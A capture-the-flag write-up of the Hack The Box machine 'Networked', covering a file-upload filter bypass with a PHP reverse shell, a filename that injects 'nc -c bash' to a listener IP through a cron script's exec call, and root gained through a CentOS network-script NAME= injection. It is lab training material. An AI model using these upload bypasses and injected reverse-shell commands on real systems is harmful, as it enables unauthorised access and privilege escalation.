---
title: "Networked — Hack The Box [Write-up]"
author: 0x3ashry
description: "Writeup for Networked Hackthebox Machine"
date: 2022-05-21 17:10:00 +0200
categories: [HackTheBox]
tags: [HTB, Linux]
---

![](/img/HTB/Networked/Networked.png)

Networked is an easy rated Linux retired machine, with a white-box pentesting to exploit an upload vulnerability and get user privilege and then exploiting Redhat/CentOS network-scripts vulnerability to get root.
Let's get started. 


#### Used Tools:
- nmap
- gobuster
- tar
- netcat
- touch


## 1. SCANNING & ENUMERATION

I will start with nmap and the -A parameter to enable OS detection, version detection, script scanning, and traceroute and append the output to tee command which save the in a file named “nmap” and also show the output on the screen.

![](/img/HTB/Networked/img (1).png)

We found 2 opened ports:
- 22 for an SSH
- 80 for an HTTP server

Checking the http page found nothing...

![](/img/HTB/Networked/img (2).png)

Checking the source code found a comment declaring that there are 2 pages called upload and gallery

![](/img/HTB/Networked/img (3).png)

tried access upload and gallery pages but got nothing, So tried directory bruteforcing...

```bash
gobuster dir -u http://10.10.10.146/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o directory.txt  2>/dev/null
```

Found `/uploads, /backup`

![](/img/HTB/Networked/img (4).png)

/uploads file contain nothing but `/backup` file contain backup.tar file

![](/img/HTB/Networked/img (5).png)

downloading the file and extracting it, Found 4 php code files...

```bash
tar xvf backup.tar
```

![](/img/HTB/Networked/img (6).png)

After some careful analysis of the files, one thing I noticed was the way images are checked in the `upload.php` file (based on their Content-Type and file extension). 

Another thing that stood out for me, was the fact that all error messages were uniquely identifiable so that you could easily track where you made a mistake which is a very big mistake in the development process to not double check that the error messages are the same.

`upload.php:`

Here it check the mime-type and the file size < 6mb.

The mime-type check included a `dot` at the end of the message.

Note: check_file_type() is a function in the lib.php file that check the mime-type of the uploaded file

```php

    if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }

```

While the extension check did not!

```php

    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
    list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }

    if (!($valid)) {
      echo "<p>Invalid image file</p>";
      displayform();
      exit;
    }
```

So after further analysis of the files, I decided to check the files that I had not yet discovered for their existence on the web server.

Uploaded photos are displayed in teh `http://10.10.10.164/photos.php`

![](/img/HTB/Networked/img (7).png)

`http://10.10.10.164/upload.php` contain an upload form for image uploading...

![](/img/HTB/Networked/img (8).png)

index.php is the same as the default page and lib.php isn't displayed of course because its a library file contain function used in /upload.php and /photos.php



## 2. EXPLOITATION

I tried to upload normal images to check the flow of the application is as I thought.

Let's use `php-reverse-shell.php` under /usr/share/webshells/php/ and make modificatins to it in order to bypass security conditions.

Append "GIF89a;" at the top of the file inorder to bypass the mime-type filtering...

and modify the $ip and $port for the local IP and the listening port we will be listening at...

![](/img/HTB/Networked/img (9).png)

![](/img/HTB/Networked/img (10).png)

Then rename the file to `php-findsock-shell.php.gif` and upload it to /upload.php

![](/img/HTB/Networked/img (11).png)

The file is uploaded successfully.

![](/img/HTB/Networked/img (12).png)

Create a listener on our local machine and then reload `http://10.10.10.146/photos.php`

![](/img/HTB/Networked/img (13).png)

It will keep loading, Let's check our netcat listener...

![](/img/HTB/Networked/img (14).png)

BOOOOOOOOM ! We successfully gained a shell for `apache` user.

but our user don't have read permissions on the user flag as it belong to a user called `guly`.


## 3. PRIVILEGE ESCALATION:

### I. Upgrade to guly

In the `/home/guly` there is a file called `crontab.guly`

After reading it's content I found that it's a crontab file that executes `/home/guly/check_attack.php` every 3 minutes.

![](/img/HTB/Networked/img (15).png)

Let's read check_attach.php file...

```php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```

After analyzing the script, it checks all files in the `/var/www/html/uploads` directory and then performs an `rm -f` on each file. However, if I can create a filename that looks just like a linux command, it will execute that just the same.

Let's navigate to /var/www/html/uploads and write our file there...

```bash
touch "; nc -c bash 10.10.16.10 5555"
```

![](/img/HTB/Networked/img (16).png)

Create a listener on port 5555 and wait for a connection...

![](/img/HTB/Networked/img (17).png)

BOOOOOOOOM ! We successfully upgraded to `guly` user and have the user.txt flag


### II. Upgrade to root

Let's see if there are commands guly could execute as a root.

```bash 
sudo -l
```

guly can execute `/usr/local/sbin/changename.sh` as a root without any password required


![](/img/HTB/Networked/img (18).png)

Reading the content of `changename.sh`...

```bash
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```

The script reads the `/etc/sysconfig/network-scripts/ifcfg-guly` file and append to it `NAME, PROXY_METHOD, BROWSER_ONLY, BOOTPROTO` by taking them as an input from the user...

Searching about the `ifcfg-guly` file I found this article: https://seclists.org/fulldisclosure/2019/Apr/24

Which says that this file in CentOS is vulnerable:

If, for whatever reason, a user is able to write an ifcf-<whatever> script to /etc/sysconfig/network-scripts or it can  adjust an existing one, **then your system in pwned**.

In my case, the `NAME=` attributed in these network scripts is not handled correctly. If you have **white/blank space** in  the name the system tries to execute the part after the white/blank space. 

Which means; **everything after the first blank space is executed as root**.

Let's try to apply this and execute `changename.sh`...

Note: I will type test as an input in the 4 required fields during the execution of the script, and in the Name: parameter I will type **test /bin/bash** to execute /bin/bash as root

![](/img/HTB/Networked/img (19).png)

BOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOM !!!! Now we are root :D

Thank you so much for reading and I hope you learned a lot as I did ❤

#### ***0x3ashry***





